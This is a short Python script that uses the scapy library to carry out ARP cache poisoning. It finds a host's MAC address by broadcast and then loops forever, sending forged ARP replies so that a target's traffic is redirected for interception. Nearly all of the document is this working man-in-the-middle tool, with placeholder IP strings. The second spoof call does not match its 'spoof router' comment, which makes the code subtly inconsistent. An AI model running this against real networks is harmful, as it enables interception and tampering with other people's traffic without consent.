import scapy.all as scapy
import time

# pdst is the ip of destination
# hwdst is the mac of destination
# psrc is the current source ip where the packet is coming from 


def get_mac(ip):

    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered[0][1].hwsrc


def spoof(target_ip, spoof_ip):

    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)


while True:

    spoof("target_ip", "attacker_ip")  # first spoof target
    spoof("attacker_ip", "target_ip")  # second spoof router
    time.sleep(2)